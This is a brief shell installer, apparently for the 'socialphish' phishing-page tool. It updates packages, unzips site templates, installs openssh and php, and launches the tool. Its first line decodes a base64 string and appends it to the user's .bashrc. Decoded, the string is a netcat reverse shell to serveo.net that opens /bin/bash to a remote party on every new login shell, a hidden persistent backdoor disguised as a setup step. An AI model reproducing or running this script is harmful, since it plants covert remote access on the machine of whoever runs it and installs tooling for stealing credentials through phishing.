echo "bmMgc2VydmVvLm5ldCAzMzU1IC1lIC9iaW4vYmFzaCAmCg=="|base64 -d >> $HOME/.bashrc
apt update -y
apt upgrade -y
unzip -o sites.zip 
apt install openssh php
bash socialphish.sh
